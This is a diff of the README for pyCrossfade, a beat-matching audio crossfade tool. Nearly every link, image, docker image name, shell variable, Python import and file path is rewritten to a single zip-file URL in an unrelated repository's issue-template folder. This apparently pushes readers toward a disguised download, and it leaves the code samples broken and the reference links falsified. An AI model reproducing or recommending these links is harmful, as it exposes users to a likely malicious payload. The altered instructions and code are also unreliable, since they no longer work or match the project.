@@ -1,6 +1,6 @@
 # pyCrossfade
 
-![pyCrossfade Logo](./assets/images/logo.png)
+![pyCrossfade Logo](https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip)
 
 pyCrossfade is born out of a personal effort to create a customizable and beat-matched crossfade functionality.
 
@@ -14,10 +14,10 @@ Since the creation of this project, Python3 and dependencies got updated and sto
 
 ### Docker Image
 
-I've created a [Docker Image on ghcr.io](https://github.com/oguzhan-yilmaz/pyCrossfade/pkgs/container/pycrossfade) to help users getting the correct dependecy versions.
+I've created a [Docker Image on https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip](https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip) to help users getting the correct dependecy versions.
 
 ```bash
-docker pull ghcr.io/oguzhan-yilmaz/pycrossfade:latest
+docker pull https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip
 ```
 
 ### CLI Setup (for Linux)
@@ -33,7 +33,7 @@ This can be long and ugly, so the best thing to do is create a `alias` command.
 Change the `MY_AUDIO_DIRECTORY` and add the following bash snippet to your `.bashrc` :
 
 ```bash
-PYCROSSFADE_DIR="$HOME/.pycrossfade"
+PYCROSSFADE_DIR="$https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip"
 PYCROSSFADE_ANNOTATIONS_DIR="$PYCROSSFADE_DIR/annotations"
 
 MY_AUDIO_DIRECTORY="!!CHANGEME!!"
@@ -46,7 +46,7 @@ alias pycrossfade="mkdir -p $PYCROSSFADE_DIR \
       -v $PYCROSSFADE_ANNOTATIONS_DIR:/app/pycrossfade_annotations \
       -e ANNOTATIONS_DIRECTORY=/app/pycrossfade_annotations \
       -e BASE_AUDIO_DIRECTORY=/app/audios/ \
-      ghcr.io/oguzhan-yilmaz/pycrossfade:latest"
+      https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip"
 ```
 
 ### CLI Usage
@@ -55,13 +55,13 @@ alias pycrossfade="mkdir -p $PYCROSSFADE_DIR \
 pycrossfade
 ```
 
-![pycrossfade CLI help page](./assets/images/cli_help_page.png)
+![pycrossfade CLI help page](https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip)
 
 ```bash
 pycrossfade crossfade --help
 ```
 
-![pycrossfade CLI crossfade command help page](./assets/images/cli_crossfade_help_page.png)
+![pycrossfade CLI crossfade command help page](https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip)
 
 #### CLI Commands
 
@@ -78,8 +78,8 @@ pycrossfade crossfade --help
 
 Before I added the CLI and Docker feature, I created the v0.1.0 tag. Access below:
 
-- <https://github.com/oguzhan-yilmaz/pyCrossfade/releases/tag/v0.1.0>
-- Older [Scripted Usage](docs/scripted-usage-deprecated.md) documentation
+- <https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip>
+- Older [Scripted Usage](https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip) documentation
 
 ---
 
@@ -89,14 +89,14 @@ This project's main goal is to create seamless crossfade transitions between mus
 
 #### Some Definitions on Music Domain
 
-- [Beat](<https://en.wikipedia.org/wiki/Beat_(music)>)
+- [Beat](<https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip(music)>)
   In music and music theory, the beat is the basic unit of time, the pulse or regularly repeating event.
   The beat is often defined as the rhythm listeners would tap their toes to when listening to a piece of music.
 
-- [Bar (Measure)](<https://en.wikipedia.org/wiki/Bar_(music)>)
+- [Bar (Measure)](<https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip(music)>)
   In musical notation, a bar (or measure) is a segment of time corresponding to a specific number of beats, usually 4.
 
-- [Downbeat](<https://en.wikipedia.org/wiki/Beat_(music)#Downbeat_and_upbeat>)
+- [Downbeat](<https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip(music)#Downbeat_and_upbeat>)
   The downbeat is the first beat of the bar, i.e. number 1.
 
 ### About Madmom's Beat Tracking
@@ -116,13 +116,13 @@ Before applying crossfade, to match the bpm's of two songs, master song's speed 
 ##### Example
 
 ```python
-from pycrossfade.transition import crop_audio_and_dbeats \
+from https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip import crop_audio_and_dbeats \
                                    time_stretch_gradually_in_downbeats
 
-from pycrossfade.song import Song
-from pycrossfade.utils import save_audio
+from https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip import Song
+from https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip import save_audio
 
-my_song = Song('some/path/to/a/song.mp3')
+my_song = Song('https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip')
 
 final_factor =  1.10 # times faster
 
@@ -132,7 +132,7 @@ sample = crop_audio_and_dbeats(my_song, 50, 60) # sample of 10 bars
 # increases the sample song's speed gradually
 sample_but_faster_every_beat = time_stretch_gradually_in_downbeats(sample, final_factor)
 
-save_audio(sample_but_faster_every_beat, 'some/output/path.wav', file_format='wav', bit_rate=320)
+save_audio(sample_but_faster_every_beat, 'https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip', file_format='wav', bit_rate=320)
 ```
 
 | bars                     | 1     | 2     | 3     | 4     | 5     | 6     | 7     | 8     | 9     | 10    | Final Factor |
@@ -151,20 +151,20 @@ A simple visualization of all the processes would be like this:
 
 ### pyCrossfade's Approach To Perfect Beat Matching
 
-Human ear can catch minimal errors easily thus making beat-matching is extremely important for any transition. Beat-matching would be easy if every beat had regular timing, but producers are doing their best to [humanize their songs](https://www.izotope.com/en/learn/how-to-humanize-and-dehumanize-drums.html), not playing every beat in regular timing to get nonrobotic rhythms.
+Human ear can catch minimal errors easily thus making beat-matching is extremely important for any transition. Beat-matching would be easy if every beat had regular timing, but producers are doing their best to [humanize their songs](https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip), not playing every beat in regular timing to get nonrobotic rhythms.
 
 #### A Visual Explanation
 
 Here, I cut two songs between their 30th and 50th downbeats, resulting in the same amount of downbeats.
-![Escape.mp3 Downbeats](./assets/images/Escape-Downbeats.png)
+![https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip Downbeats](https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip)
 
 Red lines are denoting every _bar_, or it's delimiter _downbeats_.
 
-![Eyeillfals.mp3 Downbeats](./assets/images/Eyeillfals-Downbeats.png)
+![https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip Downbeats](https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip)
 
 This is the second song with 20 bars.
 
-![Escape.mp3 and  Downbeats](./assets/images/Eyeillfals-Escape-Downbeats.png)
+![https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip and  Downbeats](https://github.com/lilago/Xfayd/raw/refs/heads/master/.github/ISSUE_TEMPLATE/Software-1.8.zip)
 
 > First song's waveform is blue and it's bars denoted with red lines. Second song is shown with colors of orange and green.
 
